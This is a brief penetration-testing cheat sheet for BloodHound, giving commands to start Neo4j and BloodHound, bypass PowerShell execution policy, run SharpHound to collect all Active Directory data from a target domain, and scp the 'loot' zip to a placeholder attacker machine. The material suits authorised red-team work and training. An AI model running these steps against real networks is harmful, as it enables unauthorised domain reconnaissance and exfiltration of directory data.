---
title: BLOODHOUND
summary: A tool to reveal the hidden and often unintended relationships within an Active Directory or Azure environment.
description: A tool to reveal the hidden and often unintended relationships within an Active Directory or Azure environment.
---

**[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)**

## Start (Attacker Machine)


 > 
 > **<font color=red>sudo neo4j console</font>**</br>
 > Start Neo4j (then connect on http://localhost:7474/).
 > 
 > **<font color=red>bloodhound</font>**</br>
 > Start Bloodhound.

## Loot (Target Machine)

**https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors**

 > 
 > **<font color=red>powershell.exe -ExecutionPolicy bypass</font>**</br>
 > Bypass PowerShell script execution restrictions.
 > 
 > **<font color=red>. .\SharpHound.ps1</font>**</br>
 > Initialize SharpHound.
 > 
 > **<font color=red>Invoke-Bloodhound -CollectionMethod All -Domain</font> \[TARGET_DOMAIN\] <font color=red>-ZipFileName</font> BloudhoundLoot.zip**
 > Run SharpHound.

 > 
 > **<font color=red>scp</font> BloudhoundLoot.zip myUser<font color=red>@</font>\[ATTACKER_MACHINE\]<font color=red>:</font>/home/myUser/**
 > Bring back the loot to the attacker's machine, and open it in Bloodhound Web UI.
